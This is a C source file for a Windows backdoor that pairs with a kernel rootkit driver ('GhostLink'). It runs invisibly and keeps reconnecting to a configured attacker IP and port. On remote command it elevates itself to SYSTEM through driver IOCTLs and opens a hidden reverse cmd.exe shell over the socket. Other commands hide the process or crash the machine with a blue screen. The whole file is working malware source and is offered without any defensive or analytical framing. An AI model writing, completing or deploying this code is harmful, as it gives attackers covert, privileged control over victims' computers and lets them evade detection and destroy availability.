#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "Secrets.h" // Contains ATTACKER_IP and ATTACKER_PORT

#pragma comment(lib, "ws2_32.lib")

// Driver IOCTL Codes
#define GHOST_DEVICE 0x8000
#define IOCTL_GHOST_AUTO_ELEVATE CTL_CODE(GHOST_DEVICE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GHOST_HIDE_PROC    CTL_CODE(GHOST_DEVICE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GHOST_BSOD         CTL_CODE(GHOST_DEVICE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _GHOST_DATA { int TargetPID; } GHOST_DATA;

// --- Helper: Activate Reverse Shell ---
void StartReverseShell(SOCKET s) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdPath[] = "cmd.exe";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    // Redirecting CMD Input/Output/Error directly to the Network Socket
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;
    si.wShowWindow = SW_HIDE; // Run invisible

    // Try to spawn the process
    if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        // Wait until CMD is closed (by 'exit' command)
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        char err[] = "[-] Failed to spawn CMD.\n";
        send(s, err, sizeof(err), 0);
    }
}

int main() {
    // 1. Initialize Winsock
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // *** CRITICAL FIX: Use WSASocketA without flags to ensure CMD compatibility ***
    // Standard socket() creates Overlapped handles which CMD dislikes.
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    addr.sin_port = htons(ATTACKER_PORT);

    // 2. Connection Loop
    while (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        Sleep(5000); // Retry silently every 5 seconds
    }

    // 3. Open Handle to Driver
    HANDLE hDevice = CreateFile(L"\\\\.\\GhostLink", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    char code;
    GHOST_DATA data;
    data.TargetPID = GetCurrentProcessId();
    DWORD bytes;

    // 4. Main Command Loop (Wait for 1 byte)
    while (recv(s, &code, 1, 0) > 0) {

        switch (code) {
        case '1': // SYSTEM SHELL
            // A. Trigger Elevation in Kernel
            if (hDevice != INVALID_HANDLE_VALUE) {
                DeviceIoControl(hDevice, IOCTL_GHOST_AUTO_ELEVATE, &data, sizeof(data), NULL, 0, &bytes, NULL);
            }
            // B. Start Shell immediately (inheriting the SYSTEM token)
            StartReverseShell(s);
            break;

        case '2': // HIDE PROCESS
            if (hDevice != INVALID_HANDLE_VALUE) {
                DeviceIoControl(hDevice, IOCTL_GHOST_HIDE_PROC, &data, sizeof(data), NULL, 0, &bytes, NULL);
            }
            break;

        case '3': // BSOD
            if (hDevice != INVALID_HANDLE_VALUE) {
                DeviceIoControl(hDevice, IOCTL_GHOST_BSOD, NULL, 0, NULL, 0, &bytes, NULL);
            }
            break;
        }
    }

    if (hDevice != INVALID_HANDLE_VALUE) CloseHandle(hDevice);
    closesocket(s);
    WSACleanup();
    return 0;
}